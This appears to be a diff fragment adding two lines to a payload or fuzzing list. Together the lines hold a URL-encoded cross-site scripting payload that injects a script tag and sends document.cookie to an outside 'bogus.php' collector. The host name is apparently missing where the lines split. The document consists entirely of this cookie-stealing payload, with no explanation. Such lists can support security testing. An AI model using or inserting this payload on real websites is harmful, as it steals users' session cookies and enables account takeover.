@@ -1,0 +1,2 @@
+%3Cscript%3Enew%20Image%28%29%2Esrc%3D%22http%3A%2F%2F
+%2Fbogus%2Ephp%3Foutput%3D%22%2Bdocument%2Ecookie%3B%3C%2Fscript%3E
